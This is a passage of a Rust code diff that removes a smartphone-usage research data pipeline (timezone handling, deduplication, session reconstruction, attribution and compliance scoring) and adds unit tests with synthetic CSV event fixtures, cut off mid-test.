-    let rows_before_timezone_handling = rows.len() as u32;
-
-    // 2. Resolve the product's four timezone policies in Rust. The primary
-    // timezone is the most frequent non-empty input value; a tie keeps the
-    // first timezone encountered, matching JavaScript Map insertion order.
-    let primary_timezone = incremental::estimate_dominant_timezone(&rows);
-    query_checkpoints.value("estimate_dominant_timezone", &primary_timezone)?;
-    let selection = incremental::resolve_timezone_strategy(
-        Arc::new(rows),
-        &opts.timezone,
-        &opts.timezone_handling,
-        &primary_timezone,
-    )?;
-    rows = Arc::try_unwrap(selection.rows).unwrap_or_else(|rows| (*rows).clone());
-    let target_timezone = selection.target_timezone;
-    let timezone_action = selection.action;
-    query_checkpoints.rows_and_value(
-        "resolve_timezone_strategy",
-        &rows,
-        &serde_json::json!({
-            "targetTimezone": &target_timezone,
-            "action": timezone_action,
-        }),
-    )?;
-    let rows_after_timezone_handling = rows.len() as u32;
-    let summarize_row_selection = incremental::summarize_row_selection(
-        rows_before_timezone_handling,
-        rows_after_timezone_handling,
-    );
-    let rows_removed_by_timezone = summarize_row_selection.removed;
-    let timezone_retained_source_rows_digest = timezone_retained_source_rows_digest(&rows);
-    let mut effective_opts = opts.clone();
-    effective_opts.timezone = target_timezone;
-    let opts = &effective_opts;
-    rows = incremental::standardize_event_clock(rows, &opts.timezone)?;
-    query_checkpoints.rows("standardize_event_clock", &rows);
-    let timezone_stage_digest = timezone_stage_digest(&rows);
-    query_checkpoints.value("summarize_row_selection", &summarize_row_selection)?;
-    record_workflow_checkpoint(
-        &mut workflow_query_group_digests,
-        &mut workflow_query_group_checkpoints,
-        workflow_rows_checkpoint_reusing_last("normalize_timezones", &rows, &query_checkpoints),
-    );
-
-    // 3. dedupe + (optional) unalign duplicate timestamps + mark gaps
-    let rows_before_deduplication = rows.len();
-    let deduped = incremental::coalesce_duplicate_event_keys(rows, opts.deduplicate_exact_rows);
-    query_checkpoints.rows("coalesce_duplicate_event_keys", &deduped);
-    let exact_duplicate_rows_removed =
-        rows_before_deduplication.saturating_sub(deduped.len()) as u32;
-    let dupes_before = count_duplicate_groups(&deduped);
-    query_checkpoints.value("summarize_duplicate_groups", &dupes_before)?;
-    let dupe_corrected = incremental::disambiguate_duplicate_timestamps(
-        deduped,
-        opts.correct_duplicate_event_timestamps,
-        &opts.same_app_stop_types,
-        &opts.other_stop_types,
-    );
-    query_checkpoints.rows("disambiguate_duplicate_timestamps", &dupe_corrected);
-    let dupes_corrected = if opts.correct_duplicate_event_timestamps {
-        dupes_before
-    } else {
-        0
-    };
-    let mut rows = incremental::mark_gaps(dupe_corrected);
-    query_checkpoints.rows("derive_time_gap_evidence", &rows);
-    record_workflow_checkpoint(
-        &mut workflow_query_group_digests,
-        &mut workflow_query_group_checkpoints,
-        workflow_rows_checkpoint_reusing_last("dedup_and_order", &rows, &query_checkpoints),
-    );
-
-    // 4. filter labeling
-    // Parsing an empty filter file already yields an empty map, so the file's
-    // emptiness is not a second condition.
-    let filter_map = if opts.use_filter_file {
-        parse_filter_csv(support.filter_csv)
-    } else {
-        HashMap::new()
-    };
-    if opts.use_filter_file {
-        rows = label_filtered_apps(rows, &filter_map);
-    }
-    query_checkpoints.rows("mark_app_policy_matches", &rows);
-    record_workflow_checkpoint(
-        &mut workflow_query_group_digests,
-        &mut workflow_query_group_checkpoints,
-        workflow_rows_checkpoint_reusing_last("app_policy", &rows, &query_checkpoints),
-    );
-    let apps_forcing_map =
-        if opts.use_apps_forcing_screen_open && !support.apps_forcing_csv.is_empty() {
-            parse_apps_forcing_csv(support.apps_forcing_csv)
-        } else {
-            HashMap::new()
-        };
-    let background_apps =
-        if opts.use_background_apps_file && !support.background_apps_csv.is_empty() {
-            parse_background_apps_csv(support.background_apps_csv)
-        } else {
-            AHashSet::new()
-        };
-
-    // 5. screen-usage derivation (if requested)
-    let mut screen_rows: Vec<Row> = Vec::new();
-    if matches!(
-        opts.usage_session_mode,
-        UsageSessionMode::ScreenUsage | UsageSessionMode::AppAndScreenUsage
-    ) {
-        screen_rows = derive_screen_usage_sessions_full(
-            &rows,
-            opts,
-            &apps_forcing_map,
-            &mut query_checkpoints,
-        )?;
-    } else {
-        query_checkpoints.state("index_keyguard_events", "not_applicable");
-        query_checkpoints.state("infer_screen_session_skeletons", "not_applicable");
-        query_checkpoints.state("classify_screen_sessions", "not_applicable");
-    }
-    record_workflow_checkpoint(
-        &mut workflow_query_group_digests,
-        &mut workflow_query_group_checkpoints,
-        workflow_rows_checkpoint("device_state_timeline", &screen_rows),
-    );
-
-    // Product contract: processedRowCount is the canonical policy-row count
-    // before session reconstruction, not the number of emitted app sessions.
-    // The old fused path overwrote it with app_row_count in app modes even
-    // when the emitted CSV bytes were otherwise identical to TypeScript.
-    let processed_count = rows.len() as u32;
-    let policy_rows = rows.clone();
-    let app_csv_bytes;
-    let screen_csv_bytes;
-    let day_coverage_csv_bytes;
-    let compliance_csv_bytes;
-    let credited_app_csv_bytes;
-    let day_coverage_row_count;
-    let compliance_row_count;
-    let credited_app_row_count;
-    let mut credited_app_row_lineage = Vec::new();
-    let app_rows_for_review;
-    let app_row_count;
-    let screen_row_count = screen_rows.len() as u32;
-
-    if matches!(
-        opts.usage_session_mode,
-        UsageSessionMode::NoUsage | UsageSessionMode::ScreenUsage
-    ) {
-        for query_id in [
-            "resolve_excluded_packages",
-            "mask_excluded_app_events",
-            "build_app_event_index",
-            "match_app_episodes",
-            "materialize_candidate_episodes",
-            "classify_episode_durations",
-            "apply_app_inclusion_policy",
-            "order_app_episodes",
-            "segment_concurrent_usage",
-            "join_app_codebook",
-            "derive_broad_category",
-            "collapse_app_genre",
-            "derive_engagement_basis",
-            "apply_episode_flags",
-            "suppress_excluded_timing",
-            "remove_selected_interaction_types",
-            "remove_zero_duration_rows",
-            "identify_credit_eligible_sessions",
-            "build_activity_witness_indexes",
-            "assess_screen_evidence_capability",
-            "summarize_daily_apps",
-            "derive_credited_intervals",
-            "materialize_credited_rows",
-            "assemble_credit_outputs",
-            "resolve_participant_windows",
-            "apply_participant_windows",
-            "resolve_sharing_status",
-            "index_survey_responses",
-            "classify_person_attribution",
-            "synthesize_placeholder_rows",
-            "index_raw_dates",
-            "build_participant_day_coverage",
-            "aggregate_attribution_minutes",
-            "compute_attribution_completeness",
-            "classify_compliance_days",
-        ] {
-            query_checkpoints.state(query_id, "not_applicable");
-        }
-        for node_id in [
-            "reconstruct_episodes",
-            "categorize_apps",
-            "episode_annotations",
-            "interval_cleaning",
-            "effective_usage",
-            "observation_window",
-            "attribute_person",
-            "day_coverage",
-            "score_compliance",
-        ] {
-            record_workflow_checkpoint(
-                &mut workflow_query_group_digests,
-                &mut workflow_query_group_checkpoints,
-                workflow_state_checkpoint(node_id, "not_applicable"),
-            );
-        }
-        app_row_count = 0;
-        app_csv_bytes = Vec::new();
-        day_coverage_csv_bytes = Vec::new();
-        compliance_csv_bytes = Vec::new();
-        credited_app_csv_bytes = Vec::new();
-        day_coverage_row_count = 0;
-        compliance_row_count = 0;
-        credited_app_row_count = 0;
-        app_rows_for_review = Vec::new();
-        screen_csv_bytes = if opts.include_screen_output {
-            write_screen_csv(&screen_rows, opts)
-        } else {
-            Vec::new()
-        };
-    } else {
-        let study_windows = if support.study_dates_csv.is_empty() {
-            Vec::new()
-        } else {
-            parse_study_windows(support.study_dates_csv)?
-        };
-        let mut shared_participants = BTreeSet::new();
-        // 6. matcher (app usage)
-        rows = run_app_usage_algorithm(rows, opts, &background_apps, &mut query_checkpoints)?;
-        record_workflow_checkpoint(
-            &mut workflow_query_group_digests,
-            &mut workflow_query_group_checkpoints,
-            workflow_rows_checkpoint_reusing_last(
-                "reconstruct_episodes",
-                &rows,
-                &query_checkpoints,
-            ),
-        );
-
-        // 7. codebook
-        let codebook_map = if opts.use_app_codebook && !support.codebook_csv.is_empty() {
-            parse_codebook_csv(support.codebook_csv)
-        } else {
-            HashMap::new()
-        };
-        let include_aliases =
-            !opts.use_app_codebook || codebook_map.is_empty() || opts.include_category_column;
-
-        // 8. enrich
-        join_codebook(&mut rows, opts.use_app_codebook, &codebook_map);
-        query_checkpoints.rows_and_value(
-            "join_app_codebook",
-            &rows,
-            &serde_json::json!({"codebookIsEmpty": codebook_map.is_empty()}),
-        )?;
-        derive_broad_category(&mut rows, opts.use_app_codebook);
-        query_checkpoints.rows("derive_broad_category", &rows);
-        collapse_app_genre(&mut rows, opts.use_app_codebook);
-        query_checkpoints.rows("collapse_app_genre", &rows);
-        record_workflow_checkpoint(
-            &mut workflow_query_group_digests,
-            &mut workflow_query_group_checkpoints,
-            workflow_rows_checkpoint_reusing_last("categorize_apps", &rows, &query_checkpoints),
-        );
-        add_app_usage_detail_columns(&mut rows, opts.custom_app_engagement_duration);
-        query_checkpoints.rows("derive_engagement_basis", &rows);
-        mark_app_usage_flags(
-            &mut rows,
-            &opts.long_data_time_gap_thresholds,
-            &opts.long_usage_duration_thresholds,
-        );
-        query_checkpoints.rows("apply_episode_flags", &rows);
-        record_workflow_checkpoint(
-            &mut workflow_query_group_digests,
-            &mut workflow_query_group_checkpoints,
-            workflow_rows_checkpoint_reusing_last("episode_annotations", &rows, &query_checkpoints),
-        );
-        clear_filtered_usage_timing(&mut rows);
-        query_checkpoints.rows("suppress_excluded_timing", &rows);
-        rows = incremental::remove_selected_interaction_types(
-            rows,
-            &opts.interaction_types_to_remove,
-            &opts.long_data_time_gap_thresholds,
-        );
-        query_checkpoints.rows("remove_selected_interaction_types", &rows);
-        rows = incremental::remove_zero_duration_rows(rows, opts.filter_zero_duration_sessions);
-        query_checkpoints.rows("remove_zero_duration_rows", &rows);
-        record_workflow_checkpoint(
-            &mut workflow_query_group_digests,
-            &mut workflow_query_group_checkpoints,
-            workflow_rows_checkpoint_reusing_last("interval_cleaning", &rows, &query_checkpoints),
-        );
-        let (credited_bytes, credited_count) = if opts.enable_screen_gated_crediting {
-            let credit_input_parts = query_checkpoints.take_last_row_parts();
-            let credited = apply_screen_gated_credit_incremental(
-                &rows,
-                &policy_rows,
-                opts,
-                include_aliases,
-                credit_input_parts.as_deref(),
-                &mut query_checkpoints,
-            )?;
-            record_workflow_checkpoint(
-                &mut workflow_query_group_digests,
-                &mut workflow_query_group_checkpoints,
-                credited.effective_usage_checkpoint,
-            );
-            credited_app_row_lineage = credited.row_lineage;
-            (credited.csv_bytes, credited.row_count)
-        } else {
-            for query_id in [
-                "identify_credit_eligible_sessions",
-                "build_activity_witness_indexes",
-                "assess_screen_evidence_capability",
-                "summarize_daily_apps",
-                "derive_credited_intervals",
-                "materialize_credited_rows",
-                "assemble_credit_outputs",
-            ] {
-                query_checkpoints.state(query_id, "not_applicable");
-            }
-            record_workflow_checkpoint(
-                &mut workflow_query_group_digests,
-                &mut workflow_query_group_checkpoints,
-                workflow_state_checkpoint("effective_usage", "not_applicable"),
-            );
-            (Vec::new(), 0)
-        };
-        credited_app_csv_bytes = credited_bytes;
-        credited_app_row_count = credited_count;
-        let resolved_participant_windows = resolve_participant_windows(&rows, &study_windows);
-        query_checkpoints.value("resolve_participant_windows", &resolved_participant_windows)?;
-        if opts.enable_study_window_filter {
-            if support.study_dates_csv.is_empty() {
-                return Err(
-                    "Study dates file is required when study-window filtering is enabled".into(),
-                );
-            }
-            let (filtered, dropped_rows, participants_without_window) =
-                apply_study_window(rows, &resolved_participant_windows);
-            rows = filtered;
-            query_checkpoints.rows_and_value(
-                "apply_participant_windows",
-                &rows,
-                &serde_json::json!({
-                    "applied": true,
-                    "droppedRows": dropped_rows,
-                    "participantsWithoutWindow": participants_without_window,
-                }),
-            )?;
-        } else {
-            let mut participants_without_window = resolved_participant_windows
-                .iter()
-                .filter_map(|entry| {
-                    entry
-                        .window
-                        .is_none()
-                        .then_some(entry.participant_id.clone())
-                })
-                .collect::<Vec<_>>();
-            participants_without_window.sort();
-            query_checkpoints.rows_and_value(
-                "apply_participant_windows",
-                &rows,
-                &serde_json::json!({
-                    "applied": false,
-                    "droppedRows": 0,
-                    "participantsWithoutWindow": participants_without_window,
-                }),
-            )?;
-        }
-        record_workflow_checkpoint(
-            &mut workflow_query_group_digests,
-            &mut workflow_query_group_checkpoints,
-            workflow_rows_checkpoint_reusing_last("observation_window", &rows, &query_checkpoints),
-        );
-        if opts.enable_person_attribution {
-            if support.device_sharing_csv.is_empty() {
-                return Err(
-                    "Device sharing file is required when person attribution is enabled".into(),
-                );
-            }
-            let sharing = parse_device_sharing(support.device_sharing_csv)?;
-            let survey = parse_survey_lookup(support.survey_attribution_csv)?;
-            let mut statuses = BTreeMap::new();
-            for participant_id in rows.iter().map(|row| &row.participant_id) {
-                if statuses.contains_key(participant_id.as_str()) {
-                    continue;
-                }
-                let status = sharing_status_for(participant_id.as_str(), &sharing)?;
-                if status == SharingStatus::Shared {
-                    shared_participants.insert(participant_id.to_string());
-                }
-                statuses.insert(participant_id.to_string(), status);
-            }
-            let resolution = SharingResolution {
-                shared_participants: statuses
-                    .iter()
-                    .filter_map(|(participant_id, status)| {
-                        (*status == SharingStatus::Shared).then_some(participant_id.clone())
-                    })
-                    .collect(),
-                non_shared_participants: statuses
-                    .iter()
-                    .filter_map(|(participant_id, status)| {
-                        (*status == SharingStatus::NonShared).then_some(participant_id.clone())
-                    })
-                    .collect(),
-                status_by_participant: statuses,
-            };
-            query_checkpoints.value("resolve_sharing_status", &resolution)?;
-            let survey_checkpoint = survey
-                .iter()
-                .map(|((participant_id, event_timestamp_ns), user)| {
-                    serde_json::json!({
-                        "participantId": participant_id,
-                        "eventTimestampNs": event_timestamp_ns,
-                        "user": user,
-                    })
-                })
-                .collect::<Vec<_>>();
-            query_checkpoints.value("index_survey_responses", &survey_checkpoint)?;
-            let (attributed_rows, attribution_report) =
-                attribute_person(rows, &resolution, &survey)?;
-            rows = attributed_rows;
-            query_checkpoints.rows_and_value(
-                "classify_person_attribution",
-                &rows,
-                &serde_json::json!({
-                    "applied": true,
-                    "report": attribution_report,
-                }),
-            )?;
-        } else {
-            query_checkpoints.value(
-                "resolve_sharing_status",
-                &serde_json::json!({"enabled": false}),
-            )?;
-            query_checkpoints.value(
-                "index_survey_responses",
-                &serde_json::json!({"enabled": false}),
-            )?;
-            query_checkpoints.rows_and_value(
-                "classify_person_attribution",
-                &rows,
-                &serde_json::json!({"applied": false}),
-            )?;
-        }
-        let shared_participants_checkpoint = value_fingerprint(&shared_participants)
-            .map_err(|error| format!("serialize shared-participant checkpoint: {error}"))?;
-        record_workflow_checkpoint(
-            &mut workflow_query_group_digests,
-            &mut workflow_query_group_checkpoints,
-            workflow_checkpoint_with_parts(
-                "attribute_person",
-                &[("rows", &rows)],
-                &[("shared_participants", &shared_participants_checkpoint)],
-                query_checkpoints.last_row_parts(),
-            ),
-        );
-        if opts.add_no_activity_placeholder_days {
-            rows = add_no_activity_placeholder_rows(rows, &policy_rows);
-        }
-        query_checkpoints.rows_and_value(
-            "synthesize_placeholder_rows",
-            &rows,
-            &serde_json::json!({"applied": opts.add_no_activity_placeholder_days}),
-        )?;
-        let raw_date_index = index_raw_dates(&policy_rows);
-        query_checkpoints.value("index_raw_dates", &raw_date_index)?;
-
-        let (coverage_bytes, coverage_count) = if opts.enable_day_coverage {
-            build_day_coverage_csv(
-                &rows,
-                &raw_date_index,
-                &study_windows,
-                &mut query_checkpoints,
-            )?
-        } else {
-            query_checkpoints.state("build_participant_day_coverage", "not_applicable");
-            (Vec::new(), 0)
-        };
-        day_coverage_csv_bytes = coverage_bytes;
-        day_coverage_row_count = coverage_count;
-        record_workflow_checkpoint(
-            &mut workflow_query_group_digests,
-            &mut workflow_query_group_checkpoints,
-            workflow_checkpoint_with_parts(
-                "day_coverage",
-                &[("rows", &rows)],
-                &[("day_coverage_csv", &day_coverage_csv_bytes)],
-                query_checkpoints.last_row_parts(),
-            ),
-        );
-        let (compliance_bytes, compliance_count) = if opts.enable_compliance_scoring {
-            let enrolled_devices = parse_enrolled_devices(support.enrolled_devices_csv)?;
-            build_compliance_csv(
-                &rows,
-                &shared_participants,
-                opts.compliance_threshold_percent,
-                &enrolled_devices,
-                &mut query_checkpoints,
-            )?
-        } else {
-            query_checkpoints.state("aggregate_attribution_minutes", "not_applicable");
-            query_checkpoints.state("compute_attribution_completeness", "not_applicable");
-            query_checkpoints.state("classify_compliance_days", "not_applicable");
-            (Vec::new(), 0)
-        };
-        compliance_csv_bytes = compliance_bytes;
-        compliance_row_count = compliance_count;
-        record_workflow_checkpoint(
-            &mut workflow_query_group_digests,
-            &mut workflow_query_group_checkpoints,
-            workflow_checkpoint(
-                "score_compliance",
-                &[],
-                &[("compliance_csv", &compliance_csv_bytes)],
-            ),
-        );
-
-        app_row_count = rows.len() as u32;
-        app_rows_for_review = rows.clone();
-        app_csv_bytes = if opts.include_app_output {
-            write_app_csv(&rows, opts, include_aliases)
-        } else {
-            Vec::new()
-        };
-        screen_csv_bytes = if matches!(opts.usage_session_mode, UsageSessionMode::AppAndScreenUsage)
-            && opts.include_screen_output
-        {
-            write_screen_csv(&screen_rows, opts)
-        } else {
-            Vec::new()
-        };
-    }
-
-    let review_summary_json_bytes =
-        serde_json::to_vec(&build_review_summary(&app_rows_for_review, &screen_rows))
-            .map_err(|error| format!("serialize review summary: {error}"))?;
-    let visualization_data_json_bytes = if opts.materialize_visualization_data {
-        serde_json::to_vec(&build_visualization_data(
-            &app_rows_for_review,
-            &screen_rows,
-            &policy_rows,
-        ))
-        .map_err(|error| format!("serialize visualization data: {error}"))?
-    } else {
-        Vec::new()
-    };
-    let aggregate_csv_outputs =
-        aggregates::build_aggregate_outputs(&app_rows_for_review, &screen_rows, opts);
-    let mut row_lineage = Vec::new();
-    if !app_csv_bytes.is_empty() {
-        row_lineage.extend(build_row_lineage(
-            "app-csv",
-            "outputs",
-            &app_rows_for_review,
-        ));
-    }
-    if !screen_csv_bytes.is_empty() {
-        row_lineage.extend(build_row_lineage("screen-csv", "outputs", &screen_rows));
-    }
-    if !credited_app_csv_bytes.is_empty() {
-        row_lineage.append(&mut credited_app_row_lineage);
-    }
-
-    let row_lineage_fingerprint = value_fingerprint(&row_lineage)
-        .map_err(|error| format!("serialize row lineage checkpoint: {error}"))?;
-    let aggregate_checkpoint_bytes = serde_json::to_vec(
-        &aggregate_csv_outputs
-            .iter()
-            .map(|aggregate| {
-                serde_json::json!({
-                    "kind": aggregate.kind,
-                    "rowCount": aggregate.row_count,
-                    "digest": format!(
-                        "sha256:{}",
-                        hex::encode(Sha256::digest(&aggregate.bytes))
-                    ),
-                })
-            })
-            .collect::<Vec<_>>(),
-    )
-    .map_err(|error| format!("serialize aggregate checkpoint: {error}"))?;
-    query_checkpoints.record(workflow_checkpoint(
-        "assemble_result_manifest",
-        &[],
-        &[
-            ("app_csv", &app_csv_bytes),
-            ("screen_csv", &screen_csv_bytes),
-            ("day_coverage_csv", &day_coverage_csv_bytes),
-            ("compliance_csv", &compliance_csv_bytes),
-            ("credited_app_csv", &credited_app_csv_bytes),
-            ("review_summary_json", &review_summary_json_bytes),
-            ("visualization_data_json", &visualization_data_json_bytes),
-            ("aggregates", &aggregate_checkpoint_bytes),
-            ("row_lineage", &row_lineage_fingerprint),
-        ],
-    ));
-    record_workflow_checkpoint(
-        &mut workflow_query_group_digests,
-        &mut workflow_query_group_checkpoints,
-        workflow_checkpoint(
-            "outputs",
-            &[],
-            &[
-                ("app_csv", &app_csv_bytes),
-                ("screen_csv", &screen_csv_bytes),
-                ("day_coverage_csv", &day_coverage_csv_bytes),
-                ("compliance_csv", &compliance_csv_bytes),
-                ("credited_app_csv", &credited_app_csv_bytes),
-                ("review_summary_json", &review_summary_json_bytes),
-                ("visualization_data_json", &visualization_data_json_bytes),
-                ("aggregates", &aggregate_checkpoint_bytes),
-                ("row_lineage", &row_lineage_fingerprint),
-            ],
-        ),
-    );
-
-    query_checkpoints.finish()?;
-
-    let expected_query_ids = crate::workflow_contract::WORKFLOW_QUERIES
-        .iter()
-        .map(|query| query.id)
-        .collect::<BTreeSet<_>>();
-    let actual_query_ids = workflow_query_checkpoints
-        .keys()
-        .map(String::as_str)
-        .collect::<BTreeSet<_>>();
-    if expected_query_ids != actual_query_ids {
-        let missing = expected_query_ids
-            .difference(&actual_query_ids)
-            .copied()
-            .collect::<Vec<_>>();
-        let unexpected = actual_query_ids
-            .difference(&expected_query_ids)
-            .copied()
-            .collect::<Vec<_>>();
-        return Err(format!(
-            "workflow query checkpoint coverage mismatch: missing={missing:?}, unexpected={unexpected:?}"
-        ));
-    }
-
-    debug_assert_eq!(
-        workflow_query_group_digests.len(),
-        crate::workflow_contract::workflow_query_group_ids().len()
-    );
-    debug_assert_eq!(
-        workflow_query_group_checkpoints.len(),
-        crate::workflow_contract::workflow_query_group_ids().len()
-    );
-    debug_assert_eq!(
-        workflow_query_digests.len(),
-        crate::workflow_contract::WORKFLOW_QUERIES.len()
-    );
-    debug_assert_eq!(
-        workflow_query_checkpoints.len(),
-        crate::workflow_contract::WORKFLOW_QUERIES.len()
-    );
-
-    Ok(PipelineV2Result {
-        app_csv_bytes: Arc::new(app_csv_bytes),
-        screen_csv_bytes: Arc::new(screen_csv_bytes),
-        day_coverage_csv_bytes: Arc::new(day_coverage_csv_bytes),
-        compliance_csv_bytes: Arc::new(compliance_csv_bytes),
-        credited_app_csv_bytes: Arc::new(credited_app_csv_bytes),
-        review_summary_json_bytes: Arc::new(review_summary_json_bytes),
-        visualization_data_json_bytes: Arc::new(visualization_data_json_bytes),
-        aggregate_csv_outputs: Arc::new(aggregate_csv_outputs),
-        row_lineage: Arc::new(row_lineage),
-        original_row_count: original_count,
-        processed_row_count: processed_count,
-        app_row_count,
-        screen_row_count,
-        day_coverage_row_count,
-        compliance_row_count,
-        credited_app_row_count,
-        duplicate_timestamps_corrected: dupes_corrected,
-        exact_duplicate_rows_removed,
-        available_timezones,
-        timezone: opts.timezone.clone(),
-        timezone_action: timezone_action.into(),
-        rows_before_timezone_handling,
-        rows_after_timezone_handling,
-        rows_removed_by_timezone,
-        timezone_retained_source_rows_digest,
-        timezone_stage_digest,
-        workflow_query_group_digests,
-        workflow_query_group_checkpoints,
-        workflow_query_digests,
-        workflow_query_checkpoints,
-    })
+    static B05_PREPARE_DECODE_COUNT: Cell<usize> = const { Cell::new(0) };
+    static B05_PREPARE_EVIDENCE_PARSE_COUNT: Cell<usize> = const { Cell::new(0) };
+    static B05_SCREEN_CONSTRUCTION_COUNT: Cell<usize> = const { Cell::new(0) };
 }
 
 // ---- unit tests ---------------------------------------------------------
@@ -7897,6 +451,3324 @@ pub fn run_pipeline_v2_with_supports(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    const B05_IDENTITY_TEST_RAW: &[u8] = concat!(
+        "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+        "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+        "Study,P01,Target Child,,Keyguard Hidden,android,2026-03-07 10:00:01,UTC\n",
+        "Study,P01,Target Child,,Keyguard Shown,android,2026-03-07 10:01:00,UTC\n",
+        "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 10:01:01,UTC\n",
+    )
+    .as_bytes();
+
+    fn b05_capable_sidecar_for_participants(
+        raw: &[u8],
+        strategy: ScreenSessionConstructionStrategyId,
+        participants: &[&str],
+    ) -> Vec<u8> {
+        let raw_digest = sha256_wire(raw);
+        let mut csv = String::from(
+            "schema_version,raw_input_sha256,participant_id,capability_id,state,evidence_basis,evidence_reference,evidence_sha256\n",
+        );
+        let capabilities = strategy
+            .required_capability_ids()
+            .iter()
+            .copied()
+            .chain([b05::CapabilityId::EqualTimestampSourceOrderPreserved])
+            .collect::<BTreeSet<_>>();
+        for participant in participants {
+            for capability in &capabilities {
+                csv.push_str(&format!(
+                    "{},{},{},{},capable,study_protocol,fixture,\n",
+                    b05::B05_INPUT_CAPABILITY_EVIDENCE_SCHEMA_VERSION,
+                    raw_digest,
+                    participant,
+                    capability.canonical_id(),
+                ));
+            }
+        }
+        csv.into_bytes()
+    }
+
+    fn b05_capable_sidecar(raw: &[u8], strategy: ScreenSessionConstructionStrategyId) -> Vec<u8> {
+        b05_capable_sidecar_for_participants(raw, strategy, &["P01"])
+    }
+
+    fn source_screen_options() -> PipelineV2Options {
+        let mut options = test_options();
+        options.usage_session_mode = UsageSessionMode::ScreenUsage;
+        options.include_app_output = false;
+        options.include_screen_output = true;
+        options.screen_session_construction_strategy =
+            ScreenSessionConstructionStrategyId::ParryToth2025SessionGlanceV1;
+        options.screen_session_construction_strategy_explicit = true;
+        options
+    }
+
+    #[test]
+    fn sequential_screen_preflight_uses_the_same_source_order_drop_as_prepared_execution() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 10:05:00,UTC\n",
+            "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:02:00,UTC\n",
+            "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 10:06:00,UTC\n",
+        ).as_bytes();
+        let mut options = test_options();
+        options.timezone = "UTC".into();
+        options.usage_session_mode = UsageSessionMode::ScreenUsage;
+        options.include_app_output = false;
+        options.include_screen_output = true;
+        options.drop_out_of_source_order_events = true;
+        let options_digest = sha256_wire(b"source order drop preflight regression");
+        let support = PipelineV2SupportFiles {
+            verified_request_options_digest: Some(&options_digest),
+            ..PipelineV2SupportFiles::default()
+        };
+        let (preflight, _) = sequential_scientific_preflight(raw, &options, support)
+            .expect("normal source-order scientific preflight");
+        let preflight_intervals = &preflight.screen_construction.as_ref()
+            .expect("Chronicle screen construction").intervals;
+        assert_eq!(preflight_intervals.len(), 1, "backward source open is dropped before construction");
+        let prepared = prepare_sequential_run(raw, &options, support)
+            .expect("prepare the same source-order request");
+        let result = run_prepared_sequential(prepared, &options, support)
+            .expect("execute the prepared source-order request");
+        assert_eq!(result.screen_row_count, 1);
+        assert_eq!(
+            serde_json::to_value(preflight_intervals).unwrap(),
+            serde_json::to_value(&result.b05_schoedel_preflight.screen_construction
+                .as_ref().expect("executed screen construction").intervals).unwrap(),
+            "preflight and prepared execution bind the same retained screen membership",
+        );
+    }
+
+    #[test]
+    fn app_only_screen_policies_activate_b05() {
+        assert!(reconstruction_base_is_reusable(&test_options()));
+
+        let mut maximum_exclusion = test_options();
+        maximum_exclusion.screen_session_maximum_duration_minutes = 60.0;
+        maximum_exclusion.screen_session_maximum_duration_disposition =
+            ScreenSessionMaximumDurationDisposition::ExcludeParticipant;
+        assert!(b05_schoedel_is_active(&maximum_exclusion));
+        assert!(requires_b05_screen_validation(&maximum_exclusion));
+
+        maximum_exclusion.screen_session_construction_strategy =
+            ScreenSessionConstructionStrategyId::ParryToth2025SessionGlanceV1;
+        assert!(!reconstruction_base_is_reusable(&maximum_exclusion));
+
+        let mut locked_audio_exclusion = test_options();
+        locked_audio_exclusion.locked_screen_audio_disposition =
+            LockedScreenAudioDisposition::ExcludeFromPhoneAndAppSessions;
+        assert!(b05_schoedel_is_active(&locked_audio_exclusion));
+        assert!(requires_b05_screen_validation(&locked_audio_exclusion));
+        assert!(!reconstruction_base_is_reusable(&locked_audio_exclusion));
+
+        let mut schoedel = test_options();
+        schoedel.episode_reconstruction_strategy =
+            EpisodeReconstructionStrategy::Schoedel2026AppWithinScreenProseV1;
+        assert!(!reconstruction_base_is_reusable(&schoedel));
+    }
+
+    const SCHOEDEL_PIPELINE_RAW: &[u8] = concat!(
+        "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+        "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+        "Study,P01,Target Child,,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
+        "Study,P01,Target Child,,Activity Paused,app.a,2026-03-07 10:00:02,UTC\n",
+        "Study,P01,Target Child,,Activity Resumed,app.a,2026-03-07 10:00:03,UTC\n",
+        "Study,P01,Target Child,,Activity Resumed,app.b,2026-03-07 10:00:05,UTC\n",
+        "Study,P01,Target Child,,Activity Paused,app.b,2026-03-07 10:00:07,UTC\n",
+        "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 10:00:08,UTC\n",
+    )
+    .as_bytes();
+
+    fn schoedel_options() -> PipelineV2Options {
+        let mut options = test_options();
+        options.usage_session_mode = UsageSessionMode::AppUsage;
+        options.episode_reconstruction_strategy =
+            EpisodeReconstructionStrategy::Schoedel2026AppWithinScreenProseV1;
+        options.filter_zero_duration_sessions = false;
+        options
+    }
+
+    #[test]
+    fn chronicle_and_schoedel_finalize_one_authoritative_pipeline_result() {
+        let options = schoedel_options();
+        let result = run_pipeline_v2_with_supports(
+            SCHOEDEL_PIPELINE_RAW,
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("Chronicle-backed Schoedel run");
+        assert_eq!(
+            result.b05_schoedel_preflight.screen_construction_phase,
+            B05ComputationPhase::Finalized
+        );
+        assert_eq!(
+            result.b05_schoedel_preflight.schoedel_reconstruction_phase,
+            B05ComputationPhase::Finalized
+        );
+        let screen = result
+            .b05_schoedel_preflight
+            .screen_construction
+            .as_ref()
+            .expect("final screen receipt");
+        assert_eq!(
+            screen.applicability.input_digest,
+            sha256_wire(SCHOEDEL_PIPELINE_RAW)
+        );
+        let episodes = &result
+            .b05_schoedel_preflight
+            .schoedel_reconstruction
+            .as_ref()
+            .expect("final Schoedel receipt")
+            .episodes;
+        assert_eq!(
+            episodes
+                .iter()
+                .map(|episode| (
+                    episode.package_name.as_str(),
+                    episode.start_ns,
+                    episode.stop_ns
+                ))
+                .collect::<Vec<_>>(),
+            vec![
